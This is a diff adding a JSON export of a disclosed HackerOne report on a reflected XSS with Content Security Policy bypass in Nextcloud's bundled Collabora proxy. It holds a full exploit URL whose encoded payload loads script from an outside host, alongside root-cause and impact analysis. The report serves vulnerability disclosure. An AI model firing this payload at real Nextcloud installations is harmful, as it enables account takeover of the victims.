@@ -1,0 +1,178 @@
+{
+  "id": 1893186,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODkzMTg2",
+  "url": "https://hackerone.com/reports/1893186",
+  "title": "Reflected XSS vulnerability with full CSP bypass in Nextcloud installations using recommended bundle",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2023-03-06T13:30:37.250Z",
+  "submitted_at": "2023-03-06T13:48:53.293Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lukasreschke",
+    "url": "/lukasreschke",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2023-31145"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-05-15T06:44:55.846Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-05-08T09:51:08.526Z",
+  "team_member_agreed_on_going_public_at": "2023-05-15T06:44:55.734Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n\nThe vulnerability report describes a reflected XSS vulnerability with full CSP bypass in Nextcloud installations using the recommended bundle. The vulnerability can be exploited to perform a trivial account takeover attack.\n\n## Steps To Reproduce:\n\n## Setup Nextcloud\nDownload the latest Nextcloud release from Docker and run it on port 80:\n\n```\ndocker run -d -p 80:80 nextcloud:latest\n```\n\nOpen `http://localhost` in your browser and enter your chosen admin username and password. On the next screen install all recommended apps. The standard \"Nextcloud Office\" here will result in installing the vulnerable `richdocumentscode` application (see [HubBundle.php](https://github.com/nextcloud/server/blob/eddc6f2103665d985a9e541b16d61fab5ba6a1ee/lib/private/App/AppStore/Bundles/HubBundle.php#L45)):\n\n{F2211280}\n\n## Exploitation\n\nOpen the following URL in your (or the victims) browser (the payload needs some extra encoding):\n\n> http://localhost/custom_apps/richdocumentscode/proxy.php?req=/browser/a4b9c74/cool.html?WOPISrc=http://example.com:%3c%69%6d%67%20%73%72%63%3d%27%27%20%6f%6e%65%72%72%6f%72%3d%27%73%3d%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%31%31%35%2c%39%39%2c%31%31%34%2c%31%30%35%2c%31%31%32%2c%31%31%36%29%29%3b%73%2e%73%72%63%3d%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%34%37%2c%20%34%37%2c%20%34%39%2c%20%35%33%2c%20%34%36%2c%20%31%31%34%2c%20%31%31%35%29%3b%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%73%29%27%3e\n\nThere is a full CSP bypass as the `proxy.php` from the default shipped \"richdocumentscode\" is not using a regular Nextcloud controller but plain PHP code:\n\n{F2211288}\n\n\n## Root cause\n\n1. Collabora Online is generating HTML documents using insecure string concatenation. ([code pointer](https://github.com/CollaboraOnline/online/blob/00b0fd48c949af475f8be0cc5bfd2149805f7905/wsd/FileServer.cpp#L719-L722))\n2. The included `proxy.php` inside the \"richdocumentscode\" is not applying any of the default CSP policies of Nextcloud, as it is running on the same origin this can be used for a trivial account take over attack. ([code pointer](https://github.com/CollaboraOnline/richdocumentscode/blob/3043ad186a9896899ff8d6f3ea83c93c5d487b48/proxy.php))\n\n## Impact\n\nThe vulnerability allows attackers to inject malicious code into web pages, which can be executed in the context of the victim's browser session. This means that an attacker can steal sensitive data, such as login credentials or personal information, or perform unauthorized actions on behalf of the victim, such as modifying or deleting data.\n\nIn this specific case, the vulnerability allows for a trivial account takeover attack. An attacker can exploit the vulnerability to inject code into the victim's browser session, allowing the attacker to take over the victim's account without their knowledge or consent. This can lead to unauthorized access to sensitive information and data, as well as the ability to perform actions on behalf of the victim.\n\nFurthermore, the fact that the vulnerability bypasses the Content Security Policy (CSP) makes it more dangerous, as CSP is an important security mechanism used to prevent cross-site scripting attacks. By bypassing CSP, attackers can circumvent the security measures put in place by the web application and execute their malicious code.",
+  "weakness": {
+    "id": 61,
+    "name": "Cross-site Scripting (XSS) - Reflected"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 2211280,
+      "file_name": "Screenshot_2023-03-06_at_14.25.38.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/szk5prfl326brpizk7c3zeik5m4u?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2023-03-06_at_14.25.38.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2023-03-06_at_14.25.38.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUE4VWKCP%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T211858Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD6naMrPZZcKfw7S6RXCNehBLHuBcQnfLCcCCzYVvyBhwIgOqSfz2K2%2BFXY10I9q28LCuPYFM7LqF2g8H5OnbFOUPUqugUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDNLV2P%2BPpkD3KMlnJyqOBYoB1mhdDbMSMzjL6Tibpm9I1ONzySXNg7df%2Fs8d0FU2JbuXuNacisQ1X660QSmG%2F3%2BciqIkW5jCUNJBvJZk5Pc85RSmwByIMx%2BhYE1p7B3Qyj05OrJSHdiom26i7Usa06wvKeSo%2FpOM1VA%2B38eTy1XA8c3RhSUXf%2B419EZfOgpn9Hi5jg0TA2wJ%2Bfw0OxHv%2BWeIYPRC6Fh%2FFd16jMcb%2FCPylpHZLUTPm7l0HsAsWf5LwZcU1oMDYI9ikkagk%2FxOHfLfpJ5skiC7Awd9AOMuEOs1jFntp%2BiUq1QdKg6JgJudAue3XDA8SQJmU%2BKmnly4czKwaoB0bBG4q%2FeGIFkzpUR3HydBL5Xn1qhvY%2FjLs0xTJRgOrC5OPtWUsNhCt5AUyViMhFPlViUp6oDoo0pJSdoReUmSetXoxfjOGkMtdAgg3z9d4mLhhTOBScDteqr7zFB02RKEBjQeoYqZSdFEM8K5JfR8NxBEf4hIKtK4KRZsIHiSzMR2YarABtC2%2BBlYv6dJfdv7TB4l7ktIKy7XKXSIMopeBMJoGMZYeGOpGBrDJF%2FKhtgTodkCDW5t%2FDacPF%2BDFCxEQP8BhNmF4YU47aIFpbICOoXLIEJNo2V9wVCbq5kqlLPO7iYqaJGC1keyM0HgB02RLGj3HTxU3AazIsMDq%2FXjx35eNcluNPo2nsW5qHqqzmv3OdWDZ1f2gDlV%2Fx9UuC%2Fjiam6rXog2ASpuJAgqAIjI9XVhgrE4fu1%2FoKpEgP6O21MoARrxyqUbtHjuVq5HOy9o2dZep5p62daN6BrYyVjM8BGydI7gAY%2BcU3GbTT7YunbXzbRNNO8k7ZvHtH%2BfiqS70HNd19qmOERGPGWMlgo7tXY8gTDOJmh1jDhx%2BLMBjqxAXBHOTuP43afPoNrwlfRVffcwZJut8laZzsJ0dGVZUX6Ovg5HOz96w3vVsbEEyMv3vcJO0B3YRgKP7XewFZxCiUEQedTqzQgEy1bi6avgXNpMGKs9WzjScjEO7g1gALkUIHSsw49GeJ%2FC%2FAG6kEx4y%2BGRlSgNUjhIZ4fBdCgahpCo5l4WOUXXyFrIpKAcdehJ0%2FlDXveWOGawZbsfNzLkjNPgIR%2FKDAidiU7psJ3jOyCBA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2e38b65982bd87634164cc92c0c062d6e0491a490b27f4c2741f20b467675d74",
+      "file_size": 335082,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 2211288,
+      "file_name": "Screenshot_2023-03-06_at_14.28.45.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/bba5dztayprvvaee64a00ygziyqk?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2023-03-06_at_14.28.45.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2023-03-06_at_14.28.45.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUE4VWKCP%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T211858Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD6naMrPZZcKfw7S6RXCNehBLHuBcQnfLCcCCzYVvyBhwIgOqSfz2K2%2BFXY10I9q28LCuPYFM7LqF2g8H5OnbFOUPUqugUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDNLV2P%2BPpkD3KMlnJyqOBYoB1mhdDbMSMzjL6Tibpm9I1ONzySXNg7df%2Fs8d0FU2JbuXuNacisQ1X660QSmG%2F3%2BciqIkW5jCUNJBvJZk5Pc85RSmwByIMx%2BhYE1p7B3Qyj05OrJSHdiom26i7Usa06wvKeSo%2FpOM1VA%2B38eTy1XA8c3RhSUXf%2B419EZfOgpn9Hi5jg0TA2wJ%2Bfw0OxHv%2BWeIYPRC6Fh%2FFd16jMcb%2FCPylpHZLUTPm7l0HsAsWf5LwZcU1oMDYI9ikkagk%2FxOHfLfpJ5skiC7Awd9AOMuEOs1jFntp%2BiUq1QdKg6JgJudAue3XDA8SQJmU%2BKmnly4czKwaoB0bBG4q%2FeGIFkzpUR3HydBL5Xn1qhvY%2FjLs0xTJRgOrC5OPtWUsNhCt5AUyViMhFPlViUp6oDoo0pJSdoReUmSetXoxfjOGkMtdAgg3z9d4mLhhTOBScDteqr7zFB02RKEBjQeoYqZSdFEM8K5JfR8NxBEf4hIKtK4KRZsIHiSzMR2YarABtC2%2BBlYv6dJfdv7TB4l7ktIKy7XKXSIMopeBMJoGMZYeGOpGBrDJF%2FKhtgTodkCDW5t%2FDacPF%2BDFCxEQP8BhNmF4YU47aIFpbICOoXLIEJNo2V9wVCbq5kqlLPO7iYqaJGC1keyM0HgB02RLGj3HTxU3AazIsMDq%2FXjx35eNcluNPo2nsW5qHqqzmv3OdWDZ1f2gDlV%2Fx9UuC%2Fjiam6rXog2ASpuJAgqAIjI9XVhgrE4fu1%2FoKpEgP6O21MoARrxyqUbtHjuVq5HOy9o2dZep5p62daN6BrYyVjM8BGydI7gAY%2BcU3GbTT7YunbXzbRNNO8k7ZvHtH%2BfiqS70HNd19qmOERGPGWMlgo7tXY8gTDOJmh1jDhx%2BLMBjqxAXBHOTuP43afPoNrwlfRVffcwZJut8laZzsJ0dGVZUX6Ovg5HOz96w3vVsbEEyMv3vcJO0B3YRgKP7XewFZxCiUEQedTqzQgEy1bi6avgXNpMGKs9WzjScjEO7g1gALkUIHSsw49GeJ%2FC%2FAG6kEx4y%2BGRlSgNUjhIZ4fBdCgahpCo5l4WOUXXyFrIpKAcdehJ0%2FlDXveWOGawZbsfNzLkjNPgIR%2FKDAidiU7psJ3jOyCBA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=baadfd629bdd75672cd754b4aeb356738f21f6adca51a755192dda7f99759e61",
+      "file_size": 142696,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-06-07T09:51:08.593Z",
+  "allow_singular_disclosure_after": -85490869.50501977,
+  "singular_disclosure_allowed": true,
+  "vote_count": 13,
+  "voters": [
+    "nicochess",
+    "zy9ard3",
+    "shreyaschavhan",
+    "madara1452",
+    "kuwrodney",
+    "locate",
+    "cherrykitten",
+    "0xark",
+    "cadmium_9n",
+    "unrelated",
+    "and 3 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.3,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 68219,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "nextcloud/richdocuments",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "id": 289232,
+      "category": "team",
+      "content": "Security advisory at https://github.com/CollaboraOnline/online/security/advisories/GHSA-rqj2-2c2x-gjmm",
+      "updated_at": "2023-05-08T09:50:05.589Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 89223,
+        "username": "nickvergessen",
+        "name": "Joas Schilling",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "Germany",
+        "created_at": "2016-07-01T08:17:59.061Z",
+        "url": "https://hackerone.com/nickvergessen",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/d6d8259739a2a4d509639b7804214d057bca547cc3fafe509ec3e3a86321b1d1"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
